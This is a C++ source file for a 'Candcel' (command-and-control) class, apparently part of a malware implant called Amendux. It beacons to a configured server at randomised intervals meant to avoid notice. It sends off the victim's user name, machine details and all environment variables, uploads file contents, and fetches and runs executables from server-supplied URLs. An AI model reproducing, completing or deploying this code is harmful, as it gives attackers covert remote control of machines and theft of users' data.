#include "stdafx.h"
#include "Log.h"
#include "Config.h"
#include "Process.h"
#include "RestClient.h"
#include "TransferClient.h"
#include "Json.h"
#include "Candcel.h"

using namespace Amendux;

Candcel *Candcel::s_Candcel = nullptr;

Candcel::Candcel()
{
	Log::Info(L"Candcel", L"Initialize candcel class");
}


Candcel::~Candcel()
{
	Log::Info(L"Candcel", L"Terminate candcel class");
}


void Candcel::InitClass()
{
	if (!Config::Current()->CanConnect()) {
		return;
	}

	if (!IsAlive()) {
		return;
	}

	Solicit();

	if (!Config::Current()->CanUpdate()) {
		return;
	}

	CheckForUpdate();
}


bool Candcel::IsAlive()
{
	Log::Info(L"Candcel", L"Check if server is alive");

	for (int i = 0; i < 10; ++i) {
		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

		rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);

		if (rc.getServerCode() == RestServerCommand::CM_SERVER_PONG) {
			return true;
		}

		Log::Error(L"Candcel", L"Server did not respond as expected, attempt " + std::to_wstring(i));

		Sleep(1000);
	}

	Log::Error(L"Candcel", L"Server did not respond as expected, giving up");

	return false;
}


DWORD Candcel::CheckIn()
{
	while (true) {
		int nextInterval = (rand() % (10 + 1)) + 5;

		/* Randomize the interval for obvious reasons */
		Sleep(nextInterval * 60 * 1000);

		if (!serverSolicitAck) {
			Solicit();
		}

		if (!serverSolicitAck) {
			continue;
		}

		Log::Info(L"Candcel", L"Sending checkin request");

		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

		JSONObject obj;
		obj[L"guid"] = new JSONValue(Config::Current()->Guid());

		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));

		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
			Log::Error(L"Candcel", L"Request failed");
		}

		checkInCount++;

		// Solicit about every two hours
		if (checkInCount % 8 == 0) {
			Solicit();
		}

		// Check for updates after about a day
		if (checkInCount > 100) {
			CheckForUpdate();
			checkInCount = 0;
		}
		
	}

	return 0;
}


void Candcel::Solicit()
{
	Log::Info(L"Candcel", L"Notify the server of this instance");

	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

	std::map<std::wstring, std::wstring> *lEnv = Util::EnvVariables();

	JSONObject env;
	for (std::map<std::wstring, std::wstring>::iterator it = lEnv->begin(); it != lEnv->end(); it++) {
		env[it->first] = new JSONValue(it->second);
	}

	delete lEnv;

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Current()->Guid());
	obj[L"cliver"] = new JSONValue(Config::getVersion());
	obj[L"winver"] = new JSONValue(Util::winver());
	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
	obj[L"maxmem"] = new JSONValue(std::to_wstring(Util::maxmem()));
	obj[L"user"] = new JSONValue(Util::user());
	obj[L"computer"] = new JSONValue(Util::machine());
	obj[L"resolution"] = new JSONValue(Util::windowResolution());
	obj[L"timezone"] = new JSONValue(Util::timezoneName());
	obj[L"variant"] = new JSONValue(Config::Current()->DisplayName());
	obj[L"env"] = new JSONValue(env);

	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
		Log::Error(L"Candcel", L"Request failed");

		serverSolicitAck = false;
		return;
	}

	serverSolicitAck = true;
}


void Candcel::UploadFile(const std::wstring& name, const std::wstring& content)
{
	Log::Info(L"Candcel", L"Upload file to server");

	if (content.size() > 128 * 1024) {
		Log::Error(L"Candcel", L"File too large");
		return;
	}

	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Current()->Guid());
	obj[L"name"] = new JSONValue(name);
	obj[L"content"] = new JSONValue(content);

	rc.Call(RestClientCommand::CM_CLIENT_UPLOAD, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
		Log::Error(L"Candcel", L"Request failed");
	}
}


void Candcel::GetUpdate(unsigned int buildNumber, const std::wstring& wurl)
{
	if (!serverSolicitAck) {
		return;
	}

	Log::Info(L"Candcel", L"Sending update request for version " + Config::getVersion(buildNumber));

	std::string url(wurl.begin(), wurl.end());

	TransferClient tc(url);
	std::wstring tmpFile = tc.Download();

	if (tmpFile.empty()) {
		return;
	}

	Process::RunUpdateInstance(tmpFile);
}


void Candcel::CheckForUpdate()
{
	if (!serverSolicitAck) {
		return;
	}

	Log::Info(L"Candcel", L"Check for update");

	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

	JSONObject obj;
	obj[L"build"] = new JSONValue((double)clientVersion);

	JSONValue *returnObj = rc.Call(RestClientCommand::CM_CLIENT_UPDATE, new JSONValue(obj));

	if (rc.getServerCode() == RestServerCommand::CM_SERVER_UPDATE) {
		if (!returnObj->IsObject()) {
			Log::Error(L"Candcel", L"Server returned no object");
			return;
		}

		Log::Info(L"Candcel", L"Update available");

		unsigned int build = static_cast<unsigned int>(returnObj->Child(L"build")->AsNumber());
		std::wstring url = returnObj->Child(L"url")->AsString();

		GetUpdate(build, url);
	} else if (rc.getServerCode() != RestServerCommand::CM_SERVER_IGNORE) {
		Log::Error(L"Candcel", L"Request failed");
	}
}
